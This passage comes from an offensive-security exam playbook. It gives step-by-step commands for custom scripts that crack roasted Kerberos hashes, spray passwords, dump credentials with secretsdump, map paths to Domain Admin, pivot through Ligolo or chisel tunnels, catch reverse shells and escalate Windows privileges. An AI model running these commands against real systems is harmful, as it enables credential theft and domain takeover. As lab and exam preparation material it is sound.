  ./sprayr.sh -u <user_from_description> -p '<password_from_description>' -t DC_IP --quick
  ```
  If it's a different user, also add to creds.txt and `./sprayr.sh --from-creds`.
- **File is empty?** → No freebies. Continue.

**2c — AS-REP roast hashes:**
```bash
cat $TOOLKIT_ROOT/ad/corp.local/hashes/asreproast.txt
```
- **Non-empty?** → Crack NOW:
  ```bash
  ./crackr.sh -q -f $TOOLKIT_ROOT/ad/corp.local/hashes/asreproast.txt
  ```
  → If cracked → `./sprayr.sh --from-creds` immediately.
- **Empty?** → No AS-REP-roastable users. Continue.

**2d — Kerberoast hashes:**
```bash
cat $TOOLKIT_ROOT/ad/corp.local/hashes/kerberoast.txt
```
- **Non-empty?** → Crack NOW:
  ```bash
  ./crackr.sh -q -f $TOOLKIT_ROOT/ad/corp.local/hashes/kerberoast.txt
  ```
  → If cracked → `./sprayr.sh --from-creds` immediately. Kerberoast creds are often service accounts with admin rights.
- **Empty?** → No kerberoastable SPNs. Continue.

**2e — Password policy:**
```bash
cat $TOOLKIT_ROOT/ad/corp.local/password_policy.txt
```
Note the lockout threshold and observation window. You need this before any domain spraying (Phase 7 Step 3).

### Step 3 — Run the full guided kill chain (interactive, recommended)

```bash
./adr.sh -d corp.local -u jdoe -p Pass -dc DC_IP --chain
```

`--chain` walks you through each stage interactively (Proceed/Skip/Quit at each step):

1. **Validate foothold** — cred test + password policy
2. **User enum + description mining** — finds passwords in AD comments
3. **Kerberoast + AS-REP roast** — collects crackable hashes
4. **Credential dump (SAM, LSA, DPAPI, browser creds)** — needs admin on target. If you're not admin, this step will fail — that's expected, skip it.
5. **BloodHound collection** — imports to BloodHound for path analysis
6. **Pass-the-hash spray** — sprays any collected NTLM hashes
7. **Share + session enum** — SYSVOL, GPP, logged-on users

### Step 4 — After chain completes, read remaining output

```bash
# Auto-generated next-step commands based on everything found
cat $TOOLKIT_ROOT/ad/corp.local/attack_commands.txt

# Legacy OS machines — easier targets for exploits
cat $TOOLKIT_ROOT/ad/corp.local/computers/old_os.txt

# GPP/SYSVOL passwords (pre-2014 domains)
cat $TOOLKIT_ROOT/ad/corp.local/shares/sysvol_interesting.txt

# Session log of your --chain run
cat $TOOLKIT_ROOT/ad/corp.local/chain_log.txt
```

**Decision on each:**

- **`attack_commands.txt` has entries?** → These are copy-paste ready. Execute them in order.
- **`old_os.txt` shows Server 2008/2003/XP/7?** → These are likely vulnerable to EternalBlue, PrintNightmare, or other known exploits. Run `searchsploit` for the specific OS version.
- **`sysvol_interesting.txt` has GPP files?** → Decrypt the cPassword:
  ```bash
  gpp-decrypt <cPassword_value>
  ```
  → Spray the decrypted password: `./sprayr.sh --from-creds`.
- **All empty?** → Continue to Step 5.

### Step 5 — BloodHound analysis

```bash
# The zip is at:
ls $TOOLKIT_ROOT/ad/corp.local/bloodhound/
```

1. Import the zip into BloodHound.
2. Mark your owned user(s) as "Owned" in the GUI.
3. Run these queries in order:
   - **"Shortest Paths to Domain Admin from Owned Principals"** — this is your attack path.
   - **"Find Principals with DCSync Rights"** — if your user can DCSync, you skip everything and dump all hashes.
   - **"Find Computers where Domain Users are Local Admin"** — free admin access.
4. **Decision:**
   - **Clear path to DA?** → Follow the path. Each hop tells you what attack to use (GenericAll → reset password, WriteDACL → grant yourself rights, etc.). Reference `Active_Directory.md` for the specific technique at each hop.
   - **No path from current user?** → You need more creds. Go back to cracking (Phase 6), look for creds on machines you already own (lootr output), or try new password sprays.

### Step 6 — If you get admin on ANY machine

```bash
impacket-secretsdump domain/user:pass@IP    # dump SAM + LSA + cached creds
./sprayr.sh --from-creds                     # re-spray EVERYTHING
```

This is the AD snowball. Every admin hit gives you more hashes, which give you more hits. Keep cycling: dump → spray → dump → spray until you hit DA or run out of new creds.

---

## Phase 9: Pivoting — `pivotr.sh`

**When:** `lootr.sh`/`lootr.ps1` or `adr.sh` reveals internal subnets/hosts not directly reachable from Kali, OR the AD DC is only reachable through a compromised host.

### Step 1 — Decide your tunnel method

```
Have SSH creds on the pivot host?
├── YES → pivotr.sh ssh (easiest setup)
└── NO  → Can you upload a binary to the pivot?
         ├── YES → pivotr.sh ligolo (preferred — full IP routing, no proxychains)
         └── NO  → pivotr.sh chisel (uses HTTP, works through restrictive firewalls)
```

### Step 2 — Set up the tunnel

**Option A — SSH dynamic port forward:**
```bash
./pivotr.sh ssh --type dynamic --pivot-ip PIVOT_IP --pivot-user user
```
→ This gives you a SOCKS proxy. You'll need `proxychains` for tools that don't support SOCKS natively.

**Option B — Ligolo (preferred — acts like a VPN, no proxychains needed):**
```bash
# On Kali: sets up TUN interface, starts proxy, optionally serves agent binary
./pivotr.sh ligolo --subnet 10.10.10.0/24 --serve

# On target: transfer and run the agent (pivotr.sh prints the exact commands)
/tmp/agent -connect KALI_IP:11601 -ignore-cert

# In Ligolo console: select session → start
```

**Option C — Chisel (fallback):**
```bash
./pivotr.sh chisel --type socks --start-server
# Follow the printed commands to transfer and run chisel client on target
```

### Step 3 — Verify the tunnel is up

```bash
./pivotr.sh status    # shows TUN interfaces, routes, running processes
```

**Decision:**
- **Status shows tunnel active?** → Continue to Step 4.
- **Status shows nothing or tunnel is dead?** → Check if the agent/client is still running on the target. Re-run it if needed. If the binary was killed, re-transfer it.

### Step 4 — Recon the internal network through the tunnel

```bash
# Ligolo — no proxychains needed, scan directly
sudo ./recon.sh --auto 10.10.10.5

# SSH/Chisel SOCKS — need proxychains
proxychains sudo ./recon.sh --auto 10.10.10.5
```

→ Now repeat the entire Phase 1 → Phase 2 → Phase 3 cycle for internal targets.

### Step 5 — Catch reverse shells back through the tunnel

Internal targets can't reach Kali directly. Use pivotr to set up listeners:

```bash
./pivotr.sh listener --port 4444 --type shell
# Prints: listener_add command for Ligolo console + penelope catch command
```

Follow the printed commands. The listener routes internal reverse shells back through the tunnel to your Penelope instance on Kali.

### Step 6 — Double pivot (second internal network)

If you compromise a host on the first internal network and find ANOTHER subnet:

```bash
./pivotr.sh ligolo2 --subnet 172.16.1.0/24
```

### Step 7 — Tunnel died? Reconnect in one command

```bash
./pivotr.sh reconnect    # reads last tunnel config, tears down stale routes, re-establishes
```

Don't manually re-do the setup. `reconnect` handles it.

> [!tip] With Ligolo active, `240.0.0.1` is the pivot host's localhost. You can reach services bound to 127.0.0.1 on the pivot without any port forward.

---

## Phase 10: Evidence Capture — `evidencr.sh`

**When:** The MOMENT you capture `local.txt` or `proof.txt`. Do NOT wait until end of engagement. Do NOT say "I'll come back to this."

### Step 1 — Run evidencr.sh immediately at each flag

```bash
# Standalone machine — both flags
./evidencr.sh -t 10.10.10.5 -n victim01 --os Linux --flags both \
  --points 20 --category standalone

# AD client — with flag value
./evidencr.sh -t 10.10.10.6 -n CLIENT01 --os Windows --flags local \
  --local-flag "abc123..." --points 10 --category AD-client

# Domain Controller
./evidencr.sh -t 10.10.10.10 -n DC01 --os Windows --flags proof \
  --proof-flag "def456..." --points 40 --category AD-DC
```

### Step 2 — Take the screenshots it prompts you for (do this NOW)

- **Local flag screenshot:** `cat local.txt && hostname && whoami && id` — all in same frame
- **Proof flag screenshot:** `cat proof.txt && hostname && whoami && id` — all in same frame
- **Low-priv shell screenshot** (hostname visible)
- **PrivEsc vector screenshot** (the command/exploit that granted elevation)
- **Root/SYSTEM shell screenshot**

> [!warning] If you skip screenshots now, you will NOT remember the exact commands 15 hours later. Do it now. It takes 30 seconds.

### Step 3 — Verify your evidence ledger

```bash
cat $TOOLKIT_ROOT/evidence/evidence_ledger.txt
```

**Decision:**
- **All captured flags appear in the ledger?** → Good. Continue attacking.
- **A flag is missing from the ledger?** → Re-run evidencr.sh for that machine now.

### Step 4 — Submit flag to engagement control panel

Do this right now, not later. Copy the flag value and submit it in the OffSec engagement portal.

---

## Scenario Playbooks

### "I just landed a shell — what do I do in the next 2 minutes?"

```
1. Catch with Penelope: penelope -p PORT -O
2. Confirm context: whoami && hostname && id && ip a
3. Screenshot: capture whoami + hostname + id in same frame NOW
4. Note the OS:
   Linux? → servr.sh http → transfer + run lootr.sh on target
   Windows? → servr.sh smb → transfer + run lootr.ps1 on target
5. While lootr runs → run escalatr.sh from Kali
6. Read lootr summary.txt → check each finding per Phase 3 decision tree
7. Feed any hashes to crackr.sh -q immediately
8. Spray any cracked cred immediately: sprayr.sh --from-creds
9. Root/SYSTEM? → evidencr.sh IMMEDIATELY → screenshot → submit flag
```

### "I found a Linux box with nothing obvious"

```
1. recon.sh ran → check quick_wins.txt
   Entries found? → Handle each one per Phase 1 Step 1 decision tree
   Empty? → Continue

2. HTTP found?
   YES → run webenum.sh --from-recon IP
         Read summary.md → check Phase 1b Step 3 decision tree
         Found domain name? → add to /etc/hosts → webenum --vhost
         Still nothing? → webenum --deep
         Still nothing? → manual ffuf with different wordlists/extensions
   NO → Continue

3. SMB found?
   YES → check enum4linux + smbmap output for readable shares
         Shares readable? → download everything, grep for passwords
         No readable shares? → try null session: smbclient -N -L //IP
   NO → Continue

4. FTP found?
   YES → check quick_wins.txt for anonymous login
         Anon works? → browse, download everything, check for writable dirs
   NO → Continue

5. SNMP found?
   YES → check running_processes.txt for passwords in process args
         Found creds? → sprayr.sh to validate
   NO → Continue

6. Nothing at all?
   → Re-run with --batch-size 500 (network congestion)
   → Run --udp-full (full UDP scan)
   → Still nothing? → Move to different target, come back in 1-2 hours
   → Check Stuck_Decision_Tree.md
```

### "I have a Windows shell with low privs — what are the fast wins?"

```
1. lootr.ps1 ran? → check summary.txt
   Didn't run? → run it first (Phase 3, Windows section)

2. Check in this priority order:
   a. always_install_elevated.txt → both keys = 1? → MSI payload → instant SYSTEM
   b. privileges.txt → SeImpersonatePrivilege? → GodPotato/PrintSpoofer
                      → SeBackupPrivilege? → dump SAM/SYSTEM hives
   c. autologon.txt → plaintext creds in registry? → spray immediately
   d. cmdkey.txt → stored credentials? → runas /savecred
   e. unquoted_service_paths.txt → writable dir in path? → drop binary + restart service
   f. writable_service_binaries.txt → replace binary + restart service

3. None of the above?
   → Run winPEAS via escalatr.sh → parse output → check quick-wins.txt
   → Check PowerShell history: type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
   → Check for saved WiFi passwords, browser creds, KeePass databases
   → Look for non-standard services or scheduled tasks running as SYSTEM

4. Truly nothing?
   → Check Stuck_Decision_Tree.md
   → Consider: did you miss a web vector? A different user path?
```

### "I have valid AD credentials — what do I do?"

```
1. Run adr.sh --quick first to validate + grab low-hanging fruit
2. Read output immediately:
   suspicious_descriptions.txt → passwords in comments? → spray them NOW
   asreproast.txt non-empty? → crackr.sh -q NOW
   kerberoast.txt non-empty? → crackr.sh -q NOW
   password_policy.txt → note lockout threshold before any spraying

3. Cracked anything? → sprayr.sh --from-creds IMMEDIATELY

4. Run adr.sh --chain for the full guided kill chain
   Each step: Proceed/Skip/Quit
   Step 4 (cred dump) will fail if you're not admin — that's expected, skip it

5. After chain completes:
   attack_commands.txt has entries? → execute them in order
   old_os.txt shows legacy OS? → searchsploit for known exploits
   sysvol_interesting.txt has GPP? → gpp-decrypt the cPassword

6. Upload BloodHound zip → mark owned users
   Run: "Shortest Paths to DA from Owned Principals"
   Clear path? → follow it, reference Active_Directory.md for each technique
   No path? → need more creds — go back to cracking, spraying, looting

7. Admin hit on any machine? →
   impacket-secretsdump domain/user:pass@IP → dump all hashes
   sprayr.sh --from-creds → spray new hashes everywhere
   Repeat: dump → spray → dump → spray until DA
```

### "I need to reach an internal host through a pivot"

```
1. Do you have SSH creds on the pivot?
   YES → pivotr.sh ssh --type dynamic --pivot-ip IP --pivot-user user
         (need proxychains for all tools)
   NO  → Can you write to disk on the pivot?
         YES → pivotr.sh ligolo --subnet SUBNET --serve  ← preferred
               (full IP routing, NO proxychains needed)
         NO  → pivotr.sh chisel --type socks --start-server
               (HTTP-based, works through restrictive firewalls)

2. Verify: pivotr.sh status
   Tunnel active? → continue
   Dead? → pivotr.sh reconnect OR re-run agent on target

3. Recon internal targets: recon.sh --auto INTERNAL_IP

4. Need reverse shell from internal target?
   → pivotr.sh listener --port PORT --type shell
   (prints listener_add + penelope catch commands)

5. Tunnel died mid-engagement?
   → pivotr.sh reconnect (one command, re-establishes from saved config)

6. Second internal network found?
   → pivotr.sh ligolo2 --subnet NEW_SUBNET
```

---

## Time Management Checkpoints

| Time Elapsed | If No Flags Yet | Action |
|---|---|---|
| T+1h | 0 flags | Re-read all recon output. Run webenum --deep. Check SNMP running_processes.txt. Try default creds manually on every login page. |
| T+2h | 0 flags | STOP working this target. Move to a different one. Fresh eyes beat tunnel vision. |
| T+3h | < 2 flags | Prioritize AD set — assumed-breach + adr.sh --chain is the fastest path to 40 points. |
| T+6h | < 3 flags | Run Stuck_Decision_Tree.md for every target. Re-read ALL lootr/recon output — you missed something. |
| T+18h | < 70 pts | Stop attacking. Write the report for what you have. Don't lose partial credit chasing points. |

---

## Script Interaction Map

```
recon.sh --quick-wins-only → rank targets → attack easiest first
recon.sh → finds HTTP → webenum.sh --from-recon IP
             → finds SMB  → check quick_wins.txt, loot shares manually
             → finds SNMP → check running_processes.txt for creds in args
             → finds any  → manual exploitation → SHELL

SHELL obtained →
  Linux:   servr.sh http → lootr.sh (on target) → escalatr.sh (Kali)
  Windows: servr.sh smb  → lootr.ps1 (on target) → escalatr.sh (Kali)

lootr / escalatr finds hashes → crackr.sh -q → cracked?
  YES → sprayr.sh --from-creds → validate ALL creds vs ALL targets
  NO  → crackr.sh escalate (rules, cewl, mask) → cracked? → sprayr.sh --from-creds

sprayr.sh finds Pwn3d! →
  SMB admin → impacket-psexec/wmiexec → SYSTEM shell → lootr → evidencr
  WinRM → evil-winrm → lootr → evidencr
  Domain admin → impacket-secretsdump DC → sprayr.sh --from-creds → own everything

AD creds available → adr.sh --quick → read suspicious_descriptions + hashes
                   → adr.sh --chain → guided kill chain
                   → crackr.sh -q on asreproast/kerberoast hashes
                   → sprayr.sh --from-creds after every crack
                   → BloodHound → Shortest Path to DA → follow the path

Internal subnets found → pivotr.sh → tunnel up → recon.sh on internals
Tunnel dies → pivotr.sh reconnect → back in one command

FLAG CAPTURED → evidencr.sh IMMEDIATELY → screenshots NOW → submit to portal

All creds auto-logged to $TOOLKIT_ROOT/creds.txt by adr.sh, crackr.sh, sprayr.sh
```

---

## Common Mistakes Under Pressure

> [!warning] DO NOT DO THESE

1. **Running lootr BEFORE stabilizing your shell** — unstable shell = incomplete collection. Get PTY first.
2. **Forgetting `sprayr.sh --from-creds` after every crack** — one command re-sprays everything. Do it every single time.
3. **Spraying domain accounts without checking lockout policy** — run `adr.sh --quick` first, read `password_policy.txt`. Use `--safe`.
4. **Not running evidencr.sh immediately at each flag** — you WILL forget attack chain details after 20 hours.
5. **Skipping servr.sh and manually typing HTTP URLs** — one wrong digit wastes 10 minutes. Use the printed commands.
6. **Running webenum without reading summary.md after** — the answers are there. Read it.
7. **Using `-Quick` on Windows lootr for privesc** — it skips AlwaysInstallElevated, unquoted paths, and DLL hijack checks.
8. **Not adding discovered vhosts to /etc/hosts before re-running webenum** — webenum can't enumerate a vhost it can't resolve.
9. **Attacking targets in order instead of by difficulty** — use `--quick-wins-only` to rank them first.
10. **Manually re-establishing tunnels after they die** — `pivotr.sh reconnect` does it in one command.
11. **Not reading SNMP `running_processes.txt`** — passwords in process command-line args is free money.
12. **Cracking hashes but not spraying the result** — a cracked password is worthless until you spray it everywhere.

---

## Related

- [[OffSec_Methodology]] — full engagement attack chain
- [[Stuck_Decision_Tree]] — when you're genuinely stuck
- [[Creds_Tracker]] — live credential tracking
- [[Active_Directory]] — manual AD techniques
- [[recon]] — recon.sh cheatsheet
- [[webenum]] — webenum.sh cheatsheet
- [[crackr]] — crackr.sh cheatsheet
- [[lootr]] — lootr.sh / lootr.ps1 cheatsheet
- [[escalatr]] — escalatr.sh cheatsheet
- [[sprayr]] — sprayr.sh cheatsheet
- [[adr]] — adr.sh cheatsheet
- [[pivotr]] — pivotr.sh cheatsheet
- [[servr]] — servr.sh cheatsheet
- [[evidencr]] — evidencr.sh cheatsheet
- [[tools_setup]] — tools_setup.sh installer/preflight
- [[workflow]] — workflow.sh quick-reference
